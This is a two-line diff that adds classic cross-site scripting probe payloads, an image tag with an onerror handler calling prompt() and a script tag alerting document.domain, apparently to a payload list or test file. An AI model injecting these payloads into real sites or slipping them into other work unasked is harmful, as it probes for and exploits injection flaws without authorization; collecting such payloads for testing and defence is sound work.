@@ -1,0 +1,2 @@
+<img src=x onerror=prompt()> 
+<script>alert(document.domain)</script>
